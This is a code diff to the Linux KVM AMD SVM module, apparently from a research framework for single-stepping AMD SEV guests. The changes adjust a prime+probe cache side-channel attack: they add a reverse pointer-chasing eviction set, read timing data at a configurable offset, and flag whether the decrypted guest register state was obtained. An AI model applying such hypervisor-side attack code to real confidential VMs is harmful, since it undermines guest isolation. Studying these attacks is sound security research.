@@ -3798,6 +3798,7 @@ static fastpath_t svm_exit_handlers_fastpath(struct kvm_vcpu *vcpu)
 static noinstr void svm_vcpu_enter_exit(struct kvm_vcpu *vcpu)
 {
 	void* chase = NULL;
+	void* chase_rev = NULL;
 	struct vcpu_svm *svm = to_svm(vcpu);
 	unsigned long vmcb_pa = svm->current_vmcb->pa;
 	unsigned apic_timer_value =0;
@@ -3814,12 +3815,10 @@ static noinstr void svm_vcpu_enter_exit(struct kvm_vcpu *vcpu)
 			calculate_steps(&global_sev_step_config);
 			//always prepare and do chase, otherwise we would need to adjust single stepping timer for cache attack case
 			if( global_sev_step_config.cache_attack_config != NULL) {
-				//TODO: probe_chase is just for testing double ev
-				cpu_fillEvSetRandomized(&chase,
+				global_sev_step_config.cache_attack_config->inplace_data_offset = 1;
+				cpu_fillEvSet(&chase, &chase_rev,
 					&global_sev_step_config.cache_attack_config->eviction_sets[global_sev_step_config.cache_attack_config->victim_lookup_table_idx]
 				);
-				cpu_prime_pointer_chasing(chase);
-				cpu_prime_pointer_chasing(chase);
 				cpu_prime_pointer_chasing(chase);
 				if( global_sev_step_config.cache_attack_config != NULL &&
 					global_sev_step_config.cache_attack_config->status == SEV_STEP_CACHE_ATTACK_WANT_PRIME &&
@@ -3840,7 +3839,7 @@ static noinstr void svm_vcpu_enter_exit(struct kvm_vcpu *vcpu)
 		my_idt_prepare_apic_timer(&global_sev_step_config, svm);
 
 		//luca: assembly code in svm/vmenter.S
-		__svm_sev_es_vcpu_run(vmcb_pa,chase,apic_timer_value);
+		__svm_sev_es_vcpu_run(vmcb_pa,chase,apic_timer_value,chase_rev, APIC_BASE + APIC_TMICT);
 		kvm_guest_exit_irqoff();
 
 		mutex_lock(&sev_step_config_mutex);
@@ -3891,9 +3890,10 @@ static noinstr void svm_vcpu_enter_exit(struct kvm_vcpu *vcpu)
 			reg_val[VRN_RDX] = vmsa->rdx;
 			reg_val[VRN_RSI] = vmsa->rsi;
 			reg_val[VRN_CR3] = vmsa->cr3;
-
+			global_sev_step_config.decrypted_vmsa_data.failed_to_get_data = false;
 		} else {
 			printk("sev_step_get_vmcb_save_area returned null for vmsa!");
+			global_sev_step_config.decrypted_vmsa_data.failed_to_get_data = true;
 		}
 		kfree(vmsa);
 	}
@@ -4173,11 +4173,12 @@ static __no_kcsan fastpath_t svm_vcpu_run(struct kvm_vcpu *vcpu)
 			addr_list_entry_t *e;
 			unsigned i = 0;
 			uint64_t eviction_set_idx = global_sev_step_config.cache_attack_config->victim_lookup_table_idx;
+			uint64_t data_offset = global_sev_step_config.cache_attack_config->inplace_data_offset;
 			addr_list_t* eviction_set = &global_sev_step_config.cache_attack_config->eviction_sets[eviction_set_idx];
 			for (e = eviction_set->first; e != NULL; e = e->next) {
 					uint64_t offset = ((uint64_t)(e->addr))&0xfffULL;
-					uint64_t timing = ((uint64_t*)(e->addr))[0];
-					uint64_t perf_diff = ((uint64_t*)(e->addr))[1];
+					uint64_t timing = ((uint64_t*)(e->addr))[data_offset+0];
+					uint64_t perf_diff = ((uint64_t*)(e->addr))[data_offset+1];
 				//cpu_probe_pointer_chasing_inplace writes measurment data to the addr stored in e->addr
 				printk("%s:%d : elem %u\t, offset 0x%03llx, time %llu, perf diff %llu\n",__FILE__,__LINE__,
 					i/64, offset, timing, perf_diff);
@@ -4192,8 +4193,8 @@ static __no_kcsan fastpath_t svm_vcpu_run(struct kvm_vcpu *vcpu)
 
 			i = 0;
 			for (e = eviction_set->first; e != NULL; e = e->next) {
-				uint64_t timing = ((uint64_t*)(e->addr))[0];
-				uint64_t perf_diff = ((uint64_t*)(e->addr))[1];
+				uint64_t timing = ((uint64_t*)(e->addr))[data_offset+0];
+				uint64_t perf_diff = ((uint64_t*)(e->addr))[data_offset+1];
 				ss_event.cache_attack_timings[i] = timing;
 				ss_event.cache_attack_perf_values[i] = perf_diff;
 				i += 1;
